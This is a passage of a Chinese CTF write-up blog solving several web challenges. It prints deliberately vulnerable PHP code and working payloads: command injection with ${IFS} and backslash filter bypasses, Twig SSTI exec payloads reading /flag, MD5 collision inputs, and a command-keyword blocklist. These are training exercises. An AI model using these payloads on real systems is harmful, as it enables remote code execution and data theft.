href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p>看到这种没有很多描述的题直接掏出dirsearch<br>扫出robots.txt<br>里面提示了fAke_f1agggg.php<br>进入查看，不出意料<br>哪哪都看一看<br>找到一个<br><img src="/images/UK82BH2SOKD0KWXEE9F6U.png"><br>很难绷<br><img src="/images/0F4A1WUAHEN3Y59N.png"><br>探索到一个新功能🙂<br><img src="/images/TLFZIYE71LUDA05O.png"><br>转化之后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><br><br><span class="hljs-comment">//level 1</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>) &lt; <span class="hljs-number">2020</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span> + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2021</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;金钱解决不了穷人的本质问题&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br><span class="hljs-comment">//level 2</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>]))&#123;<br>   <span class="hljs-variable">$md5</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5</span>==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5</span>))<br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;<br>   <span class="hljs-keyword">else</span><br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//get flag</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$get_flag</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$get_flag</span>,<span class="hljs-string">&quot; &quot;</span>))&#123;<br>        <span class="hljs-variable">$get_flag</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;wctf2020&quot;</span>, <span class="hljs-variable">$get_flag</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$get_flag</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;快到非洲了&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>好受多了，现在也容易了<br>直接payload</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts">?<span class="hljs-attr">num</span><span class="hljs-operator">=</span><span class="hljs-number">3e4</span><span class="hljs-variable">&amp;md5</span>=<span class="hljs-number">0e215962017</span><span class="hljs-variable">&amp;get_flag</span>=ls<br><span class="hljs-comment">//404.html fAke_f1agggg.php fl4g.php fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag img.jpg index.php robots.txt </span><br>?<span class="hljs-attr">num</span><span class="hljs-operator">=</span><span class="hljs-number">3e4</span><span class="hljs-variable">&amp;md5</span>=<span class="hljs-number">0e215962017</span><span class="hljs-variable">&amp;get_flag</span>=tac$<span class="hljs-punctuation">&#123;</span>IFS<span class="hljs-punctuation">&#125;</span>fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag<br><span class="hljs-comment">//flag&#123;0a4bf020-4cfd-4519-ac84-0481a8b786a2&#125; </span><br></code></pre></td></tr></table></figure><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>输入admin试试<br>回显admin<br>找到源代码<br><img src="/images/0UOK26JNCRDJ39EQSF.png"><br>看看能不能x一下<br><img src="/images/XXRMNSDFETL2IUQW.png"><br>被html转为实体字符了，不能x<br>hint中有提醒Why not take a closer look at cookies？<br>抓包看看<br>有两个包，第二个包cookie中user可以改变页面回显<br>那就抓到第二个包<br>本题的知识点是利用服务器模板注入攻击，SSTI里面的Twig攻击<br>判断模板注入类型的方法<br><img src="/images/61b42a16c2b405e6ab1ada36470713f1.png"><br>输入49,返回49表示是Twig模块<br>输入49,返回7777777表示是jinja2模块<br>在cookie处进行判断<br>user&#x3D;49,查看返回值<br><img src="/images/B08XOX2WGAPXVUVF5.png"><br>判断为Twig注入<br>由于是Twig注入，所以有国定的payload</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;id&quot;</span>)&#125;&#125;</span><span class="language-xml">//查看id</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;cat /flag&quot;</span>)&#125;&#125;</span><span class="language-xml">//查看flag</span><br></code></pre></td></tr></table></figure><p><img src="/images/AZJKHF8MYLVSXY26LX.png"><br><img src="/images/JCTE5HBQ6IX0LVB42K.png"><br><a href="https://xz.aliyun.com/t/10056#toc-16">Twig模板注入从零到一</a></p><h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>url有点奇怪<br><img src="/images/O7TO6JUWTEDZZKGNI8.png"><br>cmd随便输入123<br>有回显，执行一下命令<br>echo%201，forbid ~<br>被禁止了<br>再看img，有点像base64编码过的，base64解码一下<br><img src="/images/WHMHWO5NM9TXT02WL.png"><br>更像base64编码过的了<br>再来一下<br><img src="/images/SCSFCWCUQ0RRMHNUTV.png"><br>16进制解码试试<br><img src="/images/GSFC2R2VJOYPWHQ8WJR.png"><br>路子都知道了<br>在img里上传一个index.php试试<br>同样的方法再编码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php<br><span class="hljs-regexp">//</span>to HEX<br><span class="hljs-number">696</span>e6465782e706870<br><span class="hljs-regexp">//</span>to Base64<br>Njk2ZTY0NjU3ODJlNzA2ODcw<br><span class="hljs-regexp">//</span>to Base64<br>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3<br></code></pre></td></tr></table></figure><p><img src="/images/W79NAB1O0JIUAANS4SU5O.png"><br><a href="https://www.lddgo.net/convert/base64-to-image">base64编码转图片</a><br>下载下来后用记事本打开，php源码就找出来了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<br><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixi～ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$txt</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>重点是下面的代码</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|<span class="hljs-subst">\&#x27;</span>|<span class="hljs-subst">\&quot;</span>|\`|;|,|\*|\?|<span class="hljs-subst">\\</span>|<span class="hljs-subst">\\</span><span class="hljs-subst">\\</span>|<span class="hljs-subst">\n</span>|<span class="hljs-subst">\t</span>|<span class="hljs-subst">\r</span>|\xA0|\&#123;|\&#125;|<span class="hljs-subst">\(<span class="hljs-operator">|</span>\)</span>|\&amp;[^\d]|@|\||<span class="hljs-subst">\\</span>$|\[|\]|&#123;|&#125;|<span class="hljs-subst">\(<span class="hljs-operator">|</span>\)</span>|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    echo(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    echo <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((string)<span class="hljs-variable">$_POST</span>[&#x27;a&#x27;] <span class="hljs-operator">!==</span> (string)<span class="hljs-variable">$_POST</span>[&#x27;b&#x27;] <span class="hljs-operator">&amp;&amp;</span> md5(<span class="hljs-variable">$_POST</span>[&#x27;a&#x27;]) <span class="hljs-operator">===</span> md5(<span class="hljs-variable">$_POST</span>[&#x27;b&#x27;])) &#123;<br>        echo `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        echo (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>下面的MD5可以用MD5强碰撞来绕过</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span>&amp;b<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%d5</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span><br></code></pre></td></tr></table></figure><p>反引号为system<br>ls&amp;cat被禁用？<br>没关系<br>反斜杠绕过</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>l\s<br><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>l\s%<span class="hljs-number">20</span>/<br><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>ca\t%<span class="hljs-number">20</span>/flag<br></code></pre></td></tr></table></figure><p>强碰撞不建议用hackbar，用burp</p><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p>先上源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>一共三个类</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq">Modifier<br><span class="hljs-keyword">Show</span><br><span class="hljs-keyword">Test</span><br></code></pre></td></tr></table></figure><p>先分析Modifier类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    